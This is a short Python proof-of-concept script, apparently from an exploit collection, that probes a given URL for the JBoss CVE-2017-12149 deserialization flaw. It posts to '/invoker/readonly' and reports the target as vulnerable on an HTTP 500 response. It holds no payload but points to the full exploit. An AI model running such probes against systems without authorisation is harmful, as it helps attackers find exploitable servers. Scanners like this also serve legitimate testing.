##!/usr/bin/python
#-*- coding:utf-8 -*-
import requests
import sys

if len(sys.argv)!=2:
    print('+---------------------------------------------------------------+')
    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub          +')
    print('+---------------------------------------------------------------+')
    print('+ USE: python <filename> <url>                                  +')
    print('+ EXP: python cve-2017-12149_poc.py http://freeerror.org:8080   +')
    print('+ VER: Jboss AS 5.X                                             +')
    print('+      Jboss AS 6.X                                             +')
    print('+---------------------------------------------------------------+')
    sys.exit()
url = sys.argv[1]

vulurl = url+"/invoker/readonly"

headers = {
'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0",
'Accept': "*/*",
'Content-Type': "application/json",
'X-Requested-With': "XMLHttpRequest",
'Connection': "close",
'Cache-Control': "no-cache"
}


try:
    r =requests.post(vulurl, headers=headers, verify=False)
    e=r.status_code
except:
    print ("[-] Target "+url+" Not CVE-2017-12149 Good Luck")
    sys.exit()
if e == 500:
    print ("[+] Target "+url+" Find CVE-2017-12149  EXP:https://github.com/zhzyker/exphub")
else: 
    print ("[-] Target "+url+" Not CVE-2017-12149 Good Luck")
    exit()

